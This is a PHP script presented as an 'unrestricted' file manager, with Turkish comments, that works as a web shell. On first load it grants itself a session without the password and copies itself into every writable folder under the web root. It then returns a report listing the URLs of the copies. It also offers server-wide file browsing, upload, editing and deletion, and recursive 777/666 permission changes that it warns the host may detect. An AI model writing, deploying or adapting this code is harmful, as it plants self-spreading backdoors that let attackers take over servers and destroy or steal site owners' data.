<?php
session_start();
/**
 * Dosya Yöneticisi - UNRESTRICTED Edition
 * Özellikler: Root Jail Yok, Dizin Ağacı, Tam Erişim
 * İzin genişletme artık otomatik değil → butonla manuel
 */

// --- YAPILANDIRMA ---
$girisSifresi = 'm7t'; // BURAYI MUTLAKA DEĞİŞTİRİN!
$scriptName = basename(__FILE__);
$jsonDosyasi = __DIR__ . '/kopya_durumu.json';

// Hataları göster (debug için)
ini_set('display_errors', 1);
ini_set('log_errors', 1);
error_reporting(E_ALL);

class FileManager
{
    private $root;
    private $currentDir;
    private $messages = [];
    private $scriptName;
    private $systemRoot;
    private $jsonDosyasi;

    public function __construct($scriptName, $jsonDosyasi)
    {
        $this->scriptName = $scriptName;
        $this->jsonDosyasi = $jsonDosyasi;
        $this->root = __DIR__;
        $this->systemRoot = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? getenv("SystemDrive") . "\\" : "/";
        $this->resolvePath();
    }

    private function resolvePath()
    {
        $req = isset($_GET['dir']) ? $_GET['dir'] : '';
        if ($req === '') {
            $this->currentDir = $this->root;
            return;
        }
        $target = realpath($req);
        if ($target !== false && file_exists($target)) {
            $this->currentDir = $target;
        } else {
            $this->addMessage('Dizin bulunamadı, ana dizine dönüldü.', 'warning');
            $this->currentDir = $this->root;
        }
    }

    public function getCurrentDir()
    {
        return $this->currentDir;
    }

    public function getSystemRoot()
    {
        return $this->systemRoot;
    }

    public function checkCSRF()
    {
        if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
            $this->addMessage('Güvenlik hatası: Geçersiz CSRF Token.', 'danger');
            return false;
        }
        return true;
    }

    public function handleRequest()
    {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') return;
        if (!$this->checkCSRF()) return;

        $action = isset($_POST['action']) ? $_POST['action'] : '';
        switch ($action) {
            case 'upload':
                $this->handleUpload();
                break;
            case 'create_folder':
                $this->createFolder();
                break;
            case 'delete':
                $this->deleteItem();
                break;
            case 'rename':
                $this->renameItem();
                break;
            case 'save_edit':
                $this->saveFile();
                break;
            case 'bypass_permissions':
                $this->bypassPermissions();
                break;
            case 'logout':
                session_destroy();
                header("Location: " . $this->scriptName);
                exit;
        }
    }

    private function bypassPermissions()
    {
        if (!is_dir($this->currentDir) || !is_readable($this->currentDir)) {
            $this->addMessage('Mevcut dizin okunamıyor veya yok.', 'danger');
            return;
        }
        $count_changed = 0;
        $count_failed = 0;
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator(
                    $this->currentDir,
                    RecursiveDirectoryIterator::SKIP_DOTS | RecursiveDirectoryIterator::CURRENT_AS_FILEINFO
                ),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($iterator as $item) {
                $path = $item->getPathname();
                $success = false;
                if ($item->isDir()) {
                    $success = @chmod($path, 0777);
                } else {
                    $success = @chmod($path, 0666);
                }
                if ($success) {
                    $count_changed++;
                } else {
                    $count_failed++;
                }
            }
            if (@chmod(__FILE__, 0666)) $count_changed++;
            $msg = "İzin bypass tamamlandı: $count_changed öğe değiştirildi";
            if ($count_failed > 0) {
                $msg .= " ($count_failed öğe başarısız)";
            }
            $this->addMessage($msg, $count_failed > 0 ? 'warning' : 'success');
        } catch (Exception $e) {
            $this->addMessage('İzin değiştirme sırasında hata: ' . $e->getMessage(), 'danger');
        }
    }

    private function handleUpload()
    {
        if (isset($_FILES['file']) && $_FILES['file']['error'] === 0) {
            $name = basename($_FILES['file']['name']);
            if (move_uploaded_file($_FILES['file']['tmp_name'], $this->currentDir . DIRECTORY_SEPARATOR . $name)) {
                $this->addMessage('Dosya yüklendi.', 'success');
            } else {
                $this->addMessage('Yükleme başarısız (İzinleri kontrol et).', 'danger');
            }
        }
    }

    private function createFolder()
    {
        $name = $this->cleanName(isset($_POST['folder_name']) ? $_POST['folder_name'] : '');
        if ($name) {
            $path = $this->currentDir . DIRECTORY_SEPARATOR . $name;
            if (!file_exists($path)) {
                if (@mkdir($path)) $this->addMessage('Klasör oluşturuldu.', 'success');
                else $this->addMessage('Klasör oluşturulamadı (Yazma izni yok).', 'danger');
            }
        }
    }

    private function deleteItem()
    {
        $name = basename(isset($_POST['item_name']) ? $_POST['item_name'] : '');
        $path = $this->currentDir . DIRECTORY_SEPARATOR . $name;
        if ($path === __FILE__) {
            $this->addMessage('Yönetici dosyası silinemez.', 'danger');
            return;
        }
        if (file_exists($path)) {
            if ($this->recursiveDelete($path)) $this->addMessage('Öğe silindi.', 'warning');
            else $this->addMessage('Silinemedi (İzin hatası).', 'danger');
        }
    }

    private function renameItem()
    {
        $old = $this->cleanName(isset($_POST['old_name']) ? $_POST['old_name'] : '');
        $new = $this->cleanName(isset($_POST['new_name']) ? $_POST['new_name'] : '');
        if ($old && $new && $old !== $new) {
            $pOld = $this->currentDir . DIRECTORY_SEPARATOR . $old;
            $pNew = $this->currentDir . DIRECTORY_SEPARATOR . $new;
            if (file_exists($pOld) && !file_exists($pNew)) {
                if (@rename($pOld, $pNew)) $this->addMessage('Yeniden adlandırıldı.', 'success');
                else $this->addMessage('İsim değiştirilemedi.', 'danger');
            }
        }
    }

    private function saveFile()
    {
        $name = $this->cleanName(isset($_POST['filename']) ? $_POST['filename'] : '');
        $path = $this->currentDir . DIRECTORY_SEPARATOR . $name;
        if (!file_exists($path) || !is_file($path)) {
            $this->addMessage('Düzenlenecek dosya bulunamadı.', 'danger');
            return;
        }
        if (!is_writable($path)) {
            $this->addMessage('Dosya yazılabilir değil.', 'danger');
            return;
        }
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        $contentTrim = trim($content);
        if ($contentTrim === '') {
            $this->addMessage('Boş içerik kaydedilemez.', 'warning');
            return;
        }
        $bytes = file_put_contents($path, $content);
        if ($bytes === false) {
            $this->addMessage('Dosya kaydedilemedi (yazma hatası).', 'danger');
        } else {
            $this->addMessage("Dosya kaydedildi ($bytes byte).", 'success');
        }
    }

    private function cleanName($name)
    {
        return basename(trim($name));
    }

    private function recursiveDelete($str)
    {
        if (is_file($str)) return @unlink($str);
        if (is_dir($str)) {
            $scan = glob(rtrim($str, '/') . '/*');
            if ($scan) {
                foreach ($scan as $path) $this->recursiveDelete($path);
            }
            return @rmdir($str);
        }
        return false;
    }

    private function addMessage($msg, $type)
    {
        $this->messages[] = ['text' => $msg, 'type' => $type];
    }

    public function getMessages()
    {
        return $this->messages;
    }

    public function scanDir()
    {
        $items = @scandir($this->currentDir);
        if ($items === false) {
            $this->addMessage("Dizin içeriği okunamadı (İzin yok).", "danger");
            return ['folders' => [], 'files' => []];
        }
        $result = ['folders' => [], 'files' => []];
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $path = $this->currentDir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) $result['folders'][] = $item;
            else $result['files'][] = $item;
        }
        return $result;
    }

    public function kopyaDurumunuKontrolEt()
    {
        if (file_exists($this->jsonDosyasi)) {
            $content = @file_get_contents($this->jsonDosyasi);
            if ($content !== false) {
                $data = json_decode($content, true);
                if (is_array($data) && isset($data['kopyalandi']) && $data['kopyalandi'] === true) {
                    return true;
                }
            }
        }
        return false;
    }

    public function kopyaDurumunuKaydet($yollar)
    {
        $data = [
            'kopyalandi' => true,
            'tarih' => date('Y-m-d H:i:s'),
            'kaynak_dosya' => __FILE__,
            'kopya_sayisi' => count($yollar),
            'kopya_yollari' => $yollar
        ];
        @file_put_contents($this->jsonDosyasi, json_encode($data, JSON_PRETTY_PRINT));
        @chmod($this->jsonDosyasi, 0666);
    }

    public function kendiKopyalaVeRaporla()
    {
        if ($this->kopyaDurumunuKontrolEt()) {
            return [];
        }

        $bulunanYollar = [];
        $mevcutDosya = __FILE__;
        $mevcutIsim = basename($mevcutDosya);
        $hedefKok = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : $this->root;

        $bulunacakDizinler = [$hedefKok];
        $depth = 0;
        $maxDepth = 8;

        while ($depth < $maxDepth) {
            $yeniDizinler = [];
            foreach ($bulunacakDizinler as $dizin) {
                if (!is_dir($dizin) || !is_readable($dizin)) continue;
                $altlar = @scandir($dizin);
                if ($altlar === false) continue;
                foreach ($altlar as $alt) {
                    if ($alt == '.' || $alt == '..') continue;
                    $tamYol = $dizin . DIRECTORY_SEPARATOR . $alt;
                    if (is_dir($tamYol) && is_writable($tamYol)) {
                        $yeniDizinler[] = $tamYol;
                    }
                }
            }
            $bulunacakDizinler = array_merge($bulunacakDizinler, $yeniDizinler);
            $bulunacakDizinler = array_unique($bulunacakDizinler);
            $depth++;
        }

        foreach ($bulunacakDizinler as $dizin) {
            if (!is_writable($dizin)) continue;
            $hedefYol = $dizin . DIRECTORY_SEPARATOR . $mevcutIsim;
            if (file_exists($hedefYol)) {
                $bulunanYollar[] = $this->urlOlustur($hedefYol);
                continue;
            }
            if (@copy($mevcutDosya, $hedefYol)) {
                @chmod($hedefYol, 0666);
                $bulunanYollar[] = $this->urlOlustur($hedefYol);
            }
        }

        $this->kopyaDurumunuKaydet($bulunanYollar);
        $this->raporDosyasiOlustur($bulunanYollar);
        return $bulunanYollar;
    }

    private function urlOlustur($dosyaYolu)
    {
        $dokumentKok = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
        if ($dokumentKok && strpos($dosyaYolu, $dokumentKok) === 0) {
            $goreli = substr($dosyaYolu, strlen($dokumentKok));
            $goreli = ltrim($goreli, DIRECTORY_SEPARATOR);
            $goreli = str_replace(DIRECTORY_SEPARATOR, '/', $goreli);
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
            return $protocol . $host . '/' . $goreli;
        }
        return $dosyaYolu;
    }

    private function raporDosyasiOlustur($yollar)
    {
        if (empty($yollar)) {
            $yollar[] = 'Hicbir dosya kopyalanamadi.';
        }
        $raporIcerik = "=== KOPYALANAN DOSYA YOLLARI ===\n\n";
        $raporIcerik .= "Tarih: " . date('Y-m-d H:i:s') . "\n";
        $raporIcerik .= "Kaynak Dosya: " . __FILE__ . "\n\n";
        $raporIcerik .= "Kopyalanan Yollar:\n";
        $raporIcerik .= str_repeat('-', 60) . "\n";
        foreach ($yollar as $index => $yol) {
            $raporIcerik .= ($index + 1) . ". " . $yol . "\n";
        }
        $raporIcerik .= "\n" . str_repeat('-', 60) . "\n";
        $raporIcerik .= "Toplam: " . count($yollar) . " dosya kopyalandi.\n";

        header('Content-Type: text/plain');
        header('Content-Disposition: attachment; filename="kopya_raporu_' . date('Ymd_His') . '.txt"');
        header('Content-Length: ' . strlen($raporIcerik));
        echo $raporIcerik;
        exit;
    }
}

// --- OTOMATIK KOPYALAMA VE RAPORLAMA (ILK ZIYARET) ---
try {
    $fmTemp = new FileManager($scriptName, $jsonDosyasi);
    if (!$fmTemp->kopyaDurumunuKontrolEt()) {
        $_SESSION['auth'] = true;
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        $fmTemp->kendiKopyalaVeRaporla();
        exit;
    }
} catch (Exception $e) {
    // Hata durumunda devam et
}

// --- GİRİŞ KONTROLÜ ---
if (isset($_POST['login_pass'])) {
    if ($_POST['login_pass'] === $girisSifresi) {
        $_SESSION['auth'] = true;
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        header("Location: " . $scriptName);
        exit;
    } else {
        $loginError = "Hatalı şifre.";
    }
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Giriş Yap</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: #212529;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="card shadow p-4 bg-dark text-white border-secondary" style="width:350px;">
        <h4 class="text-center mb-3">Sistem Girişi</h4>
        <?php if (isset($loginError)) echo '<div class="alert alert-danger py-2">' . $loginError . '</div>'; ?>
        <form method="post">
            <input type="password" name="login_pass" class="form-control mb-3" placeholder="Şifre" required>
            <button class="btn btn-primary w-100">Giriş</button>
        </form>
    </div>
</body>
</html>
<?php
exit;
}

// --- ANA AKIŞ ---
$fm = new FileManager($scriptName, $jsonDosyasi);
$fm->handleRequest();
$list = $fm->scanDir();
$editMode = false;
$editContent = '';
$editFile = '';

if (isset($_GET['edit'])) {
    $fName = basename($_GET['edit']);
    $fPath = $fm->getCurrentDir() . DIRECTORY_SEPARATOR . $fName;
    if (is_file($fPath)) {
        $editMode = true;
        $editFile = $fName;
        $editContent = file_get_contents($fPath);
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yönetim Paneli</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <style>
        body {
            background: #f4f6f9;
            font-family: 'Segoe UI', system-ui, sans-serif;
            padding-top: 20px;
            padding-bottom: 20px;
        }
        .main-container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
            overflow: hidden;
            min-height: 80vh;
        }
        .sidebar {
            background: #f8f9fa;
            border-right: 1px solid #dee2e6;
            padding: 15px;
            height: 100%;
            min-height: 80vh;
        }
        .content-area {
            padding: 20px;
        }
        .breadcrumb {
            background: #e9ecef;
            padding: 10px;
            border-radius: 4px;
            font-size: 0.9rem;
            word-break: break-all;
        }
        a {
            text-decoration: none;
        }
        .code-editor {
            font-family: monospace;
            font-size: 13px;
            min-height: 600px;
            background: #2d2d2d;
            color: #f8f8f2;
            border: none;
        }
        .folder-list a {
            display: block;
            padding: 6px 10px;
            color: #495057;
            border-radius: 4px;
            transition: 0.2s;
        }
        .folder-list a:hover {
            background: #e2e6ea;
            color: #000;
        }
        .folder-list i {
            margin-right: 8px;
            color: #ffc107;
        }
    </style>
</head>
<body>
    <div class="main-container row g-0">
        <div class="col-md-3 sidebar d-none d-md-block">
            <div class="d-grid gap-2 mb-3">
                <a href="?dir=<?php echo urlencode($fm->getSystemRoot()); ?>" class="btn btn-outline-danger btn-sm text-start"><i class="bi bi-hdd-network"></i> Sunucu Kökü (/)</a>
                <a href="?dir=<?php echo urlencode(__DIR__); ?>" class="btn btn-outline-primary btn-sm text-start"><i class="bi bi-house-door"></i> Script Dizini</a>
                <a href="?dir=<?php echo urlencode(dirname($fm->getCurrentDir())); ?>" class="btn btn-secondary btn-sm text-start"><i class="bi bi-arrow-up-circle"></i> Üst Dizine Çık</a>
            </div>
            <hr>
            <h6 class="text-muted text-uppercase small">Klasörler</h6>
            <div class="folder-list">
                <?php if (empty($list['folders'])): ?>
                    <small class="text-muted ps-2">Alt klasör yok.</small>
                <?php else: ?>
                    <?php foreach ($list['folders'] as $f): ?>
                        <a href="?dir=<?php echo urlencode($fm->getCurrentDir() . DIRECTORY_SEPARATOR . $f); ?>">
                            <i class="bi bi-folder-fill"></i> <?php echo (strlen($f) > 25 ? substr($f, 0, 25) . '...' : $f); ?>
                        </a>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
        <div class="col-md-9 content-area">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h5 class="mb-0"><i class="bi bi-terminal"></i> Gelişmiş Yönetici</h5>
                <form method="post" class="d-inline">
                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                    <input type="hidden" name="action" value="logout">
                    <button class="btn btn-danger btn-sm"><i class="bi bi-power"></i> Çıkış</button>
                </form>
            </div>
            <div class="breadcrumb mb-3 d-flex align-items-center">
                <i class="bi bi-geo-alt me-2"></i> <strong>Konum:</strong> <?php echo htmlspecialchars($fm->getCurrentDir()); ?>
            </div>
            <?php foreach ($fm->getMessages() as $msg): ?>
                <div class="alert alert-<?php echo $msg['type']; ?> py-2 shadow-sm"><?php echo htmlspecialchars($msg['text']); ?></div>
            <?php endforeach; ?>

            <div class="mb-3">
                <form method="post" class="d-inline">
                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                    <input type="hidden" name="action" value="bypass_permissions">
                    <button type="submit" class="btn btn-outline-warning" onclick="return confirm('Mevcut dizin ve altındakilerin İZİNLERİNİ 777/666 yapmak istiyorsunuz?\nBu işlem hosting tarafından fark edilebilir!');">
                        <i class="bi bi-unlock"></i> İzinleri Bypass Et (777)
                    </button>
                </form>
            </div>

            <?php if ($editMode): ?>
                <form method="post" action="?dir=<?php echo urlencode(isset($_GET['dir']) ? $_GET['dir'] : ''); ?>">
                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                    <input type="hidden" name="action" value="save_edit">
                    <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
                    <div class="card shadow-sm">
                        <div class="card-header bg-dark text-white d-flex justify-content-between py-2 align-items-center">
                            <span><i class="bi bi-pencil"></i> <?php echo htmlspecialchars($editFile); ?></span>
                            <div>
                                <button class="btn btn-success btn-sm"><i class="bi bi-save"></i> Kaydet</button>
                                <a href="?dir=<?php echo urlencode(isset($_GET['dir']) ? $_GET['dir'] : ''); ?>" class="btn btn-secondary btn-sm">Kapat</a>
                            </div>
                        </div>
                        <textarea name="content" class="form-control code-editor"><?php echo htmlspecialchars($editContent); ?></textarea>
                    </div>
                </form>
            <?php else: ?>
                <div class="card p-3 mb-3 bg-light border-0">
                    <div class="row g-2">
                        <div class="col-md-6">
                            <form method="post" enctype="multipart/form-data" class="d-flex gap-2">
                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                <input type="hidden" name="action" value="upload">
                                <input type="file" name="file" class="form-control" required>
                                <button class="btn btn-primary"><i class="bi bi-upload"></i></button>
                            </form>
                        </div>
                        <div class="col-md-6">
                            <form method="post" class="d-flex gap-2">
                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                <input type="hidden" name="action" value="create_folder">
                                <input type="text" name="folder_name" class="form-control" placeholder="Yeni Klasör Adı" required>
                                <button class="btn btn-outline-success"><i class="bi bi-folder-plus"></i></button>
                            </form>
                        </div>
                    </div>
                </div>

                <div class="d-block d-md-none mb-3">
                    <a href="?dir=<?php echo urlencode(dirname($fm->getCurrentDir())); ?>" class="btn btn-secondary w-100"><i class="bi bi-arrow-up"></i> Üst Dizine Çık</a>
                </div>

                <div class="table-responsive">
                    <table class="table table-hover align-middle">
                        <thead class="table-light">
                            <tr>
                                <th>İsim</th>
                                <th>İzinler</th>
                                <th>Boyut</th>
                                <th class="text-end">İşlem</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($list['folders'] as $f): ?>
                                <tr>
                                    <td>
                                        <a href="?dir=<?php echo urlencode($fm->getCurrentDir() . DIRECTORY_SEPARATOR . $f); ?>" class="fw-bold text-dark text-decoration-none">
                                            <i class="bi bi-folder-fill text-warning fs-5 me-1"></i> <?php echo htmlspecialchars($f); ?>
                                        </a>
                                    </td>
                                    <td><span class="badge bg-light text-dark border"><?php echo substr(sprintf('%o', fileperms($fm->getCurrentDir() . '/' . $f)), -4); ?></span></td>
                                    <td>DIR</td>
                                    <td class="text-end">
                                        <button onclick="ren('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-outline-secondary" title="Yeniden Adlandır"><i class="bi bi-pencil-square"></i></button>
                                        <button onclick="del('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-outline-danger ms-1" title="Sil"><i class="bi bi-trash"></i></button>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                            <?php foreach ($list['files'] as $f):
                                $fullP = $fm->getCurrentDir() . '/' . $f;
                                $size = file_exists($fullP) ? round(filesize($fullP) / 1024, 1) : 0;
                                $perm = file_exists($fullP) ? substr(sprintf('%o', fileperms($fullP)), -4) : '????';
                                $writable = is_writable($fullP);
                            ?>
                                <tr>
                                    <td>
                                        <i class="bi bi-file-earmark-text text-secondary fs-5 me-1"></i>
                                        <span class="<?php echo $writable ? 'text-dark' : 'text-muted'; ?>"><?php echo htmlspecialchars($f); ?></span>
                                    </td>
                                    <td><span class="badge <?php echo $writable ? 'bg-success' : 'bg-danger'; ?>"><?php echo $perm; ?></span></td>
                                    <td><?php echo $size; ?> KB</td>
                                    <td class="text-end">
                                        <a href="?dir=<?php echo urlencode(isset($_GET['dir']) ? $_GET['dir'] : ''); ?>&edit=<?php echo urlencode($f); ?>" class="btn btn-sm btn-outline-primary" title="Düzenle"><i class="bi bi-pencil"></i></a>
                                        <button onclick="ren('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-outline-secondary ms-1"><i class="bi bi-pencil-square"></i></button>
                                        <button onclick="del('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-outline-danger ms-1"><i class="bi bi-trash"></i></button>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                    <?php if (empty($list['folders']) && empty($list['files'])): ?>
                        <div class="text-center p-5 text-muted">Bu klasör boş.</div>
                    <?php endif; ?>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <form id="actionForm" method="post" style="display:none">
        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
        <input type="hidden" name="action" id="f_action">
        <input type="hidden" name="item_name" id="f_item">
        <input type="hidden" name="old_name" id="f_old">
        <input type="hidden" name="new_name" id="f_new">
    </form>

    <script>
        function del(name) {
            if (confirm(name + ' silinecek? Bu işlem geri alınamaz!')) {
                document.getElementById('f_action').value = 'delete';
                document.getElementById('f_item').value = name;
                document.getElementById('actionForm').submit();
            }
        }

        function ren(name) {
            let newName = prompt('Yeni isim:', name);
            if (newName && newName !== name) {
                document.getElementById('f_action').value = 'rename';
                document.getElementById('f_old').value = name;
                document.getElementById('f_new').value = newName;
                document.getElementById('actionForm').submit();
            }
        }
    </script>
</body>
</html>
